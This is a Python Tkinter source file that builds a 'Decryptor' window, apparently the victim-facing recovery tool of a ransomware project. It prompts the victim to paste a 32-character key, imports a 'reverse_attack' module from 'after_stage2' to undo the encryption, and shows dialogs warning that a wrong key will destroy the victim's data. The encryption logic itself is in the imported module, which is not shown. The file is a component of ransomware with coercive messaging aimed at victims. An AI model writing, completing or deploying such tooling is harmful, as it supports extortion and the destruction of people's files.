#! /usr/bin/env python
#  -*- coding: utf-8 -*-

import sys

try:
    import Tkinter as tk
    from Tkinter import messagebox
except ImportError:
    from tkinter import messagebox
    import tkinter as tk

try:
    import ttk
    py3 = False
except ImportError:
    import tkinter.ttk as ttk
    py3 = True
    
try:
    import reverse_attack
except ImportError:
    from after_stage2 import reverse_attack

from PIL import Image, ImageTk
import os

def start_gui():
    '''Starting point when module is the main routine.'''
    global prog_location, root
    prog_call = sys.argv[0]
    prog_location = os.path.split(prog_call)[0]    
    root = tk.Toplevel()
    top = DecryptorGUI(root)
    root.mainloop()

class DecryptorGUI:
    def __init__(self, top=None):
        '''This class configures and populates the toplevel window.
           top is the toplevel containing window.'''
        _bgcolor = '#d9d9d9'  # X11 color: 'gray85'
        _fgcolor = '#000000'  # X11 color: 'black'
        _compcolor = '#d9d9d9' # X11 color: 'gray85'
        _ana1color = '#d9d9d9' # X11 color: 'gray85'
        _ana2color = '#ececec' # Closest X11 color: 'gray92'
        font9 = "-family {Segoe UI} -size 12 -weight bold -slant roman"  \
            " -underline 0 -overstrike 0"

        top.geometry("396x114+408+305")
        icon_location = ImageTk.PhotoImage(file=os.path.join(prog_location,"img/lock.ico"))
        top.tk.call('wm', 'iconphoto', top._w, icon_location)         
        top.resizable(0, 0)
        top.title("Decryptor")
        top.configure(background="#ff0000")
        top.configure(highlightbackground="#d9d9d9")
        top.configure(highlightcolor="black")

        self.Entry1 = tk.Entry(top)
        self.Entry1.place(relx=0.29, rely=0.36,height=30, relwidth=0.692)
        self.Entry1.configure(background="white")
        self.Entry1.configure(disabledforeground="#a3a3a3")
        self.Entry1.configure(font="TkFixedFont")
        self.Entry1.configure(foreground="#000000")
        self.Entry1.configure(highlightbackground="#d9d9d9")
        self.Entry1.configure(highlightcolor="black")
        self.Entry1.configure(insertbackground="black")
        self.Entry1.configure(selectbackground="#c4c4c4")
        self.Entry1.configure(selectforeground="black")

        self.Label1 = tk.Label(top)
        self.Label1.place(relx=0.02, rely=0.36, height=31, width=104)
        self.Label1.configure(activebackground="#f9f9f9")
        self.Label1.configure(activeforeground="black")
        self.Label1.configure(background="#ff0000")
        self.Label1.configure(disabledforeground="#a3a3a3")
        self.Label1.configure(font="-family {Segoe UI} -size 14 -weight bold")
        self.Label1.configure(foreground="#ffff62")
        self.Label1.configure(highlightbackground="#d9d9d9")
        self.Label1.configure(highlightcolor="black")
        self.Label1.configure(text='''Enter KEY :''')

        self.Button1 = tk.Button(top, command=self.decryptor)
        self.Button1.place(relx=0.023, rely=0.719, height=24, width=377)
        self.Button1.configure(activebackground="#ececec")
        self.Button1.configure(activeforeground="#000000")
        self.Button1.configure(background="#ffff4a")
        self.Button1.configure(disabledforeground="#a3a3a3")
        self.Button1.configure(font="-family {Segoe UI} -size 11 -weight bold")
        self.Button1.configure(foreground="#ff0000")
        self.Button1.configure(highlightbackground="#d9d9d9")
        self.Button1.configure(highlightcolor="black")
        self.Button1.configure(pady="0")
        self.Button1.configure(text='''Start Decryption/ File Recovery''')

        self.Label2 = tk.Label(top)
        self.Label2.place(relx=0.003, rely=0.088, height=21, width=394)
        self.Label2.configure(background="#ffff62")
        self.Label2.configure(disabledforeground="#a3a3a3")
        self.Label2.configure(font=font9)
        self.Label2.configure(foreground="#ff0000")
        self.Label2.configure(text='''CTRL + V To Paste KEY''')
        
    
    def decryptor(self):
        key = self.Entry1.get()
    
        if len(key) == 32: 
            ask = messagebox.askyesno('ATTENTION : Are You Sure?', 'Is this Key Correct?\n\nDecryption From Invalid Key Just\nGoing to Destroy your Data!!')
            if ask == True:
                reverse = reverse_attack.Reverse(key)   #Making object of Reverse Class         
                reverse.start() #Starts Decryption Process
                messagebox.showinfo('Decryption Process Completed : )', 'Decryption/Recovery of File is Completed Successfully!')
        else:
            messagebox.showerror('Invalid Key', 'You Entered Invalid Decryption Key.\nDecrytion from Invalid Key Will,\nJust Destroy Whole Data : (')
            

if __name__ == '__main__':
    start_gui()





